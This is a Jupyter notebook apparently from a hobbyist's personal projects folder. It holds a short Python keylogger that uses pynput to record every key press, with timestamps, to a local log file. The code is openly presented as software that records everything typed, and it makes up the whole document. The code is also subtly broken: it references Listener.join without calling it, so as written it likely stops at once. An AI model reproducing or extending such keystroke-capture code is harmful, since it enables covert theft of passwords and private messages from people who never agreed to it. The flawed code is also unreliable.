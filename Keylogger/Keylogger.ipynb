{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "#keylogger: sofrware that records everything that will be typed \n",
    "import pynput\n",
    "from pynput.keyboard import Key, Listener\n",
    "import logging \n",
    "\n",
    "log_dir = r\"C:\\Users\\MoHay\\Documents\\Python Scripts\\projects\\Projects\\My-projects\\My-projects\\Keylogger\"\n",
    "logging.basicConfig(filename = (log_dir + r\"/keyLog.txt\"), level=logging.DEBUG, format='%(asctime)s: %(message)s')\n",
    "\n",
    "def on_press(key):\n",
    "    logging.info(str(key))\n",
    "\n",
    "with Listener(on_press=on_press) as listener:\n",
    "    Listener.join\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
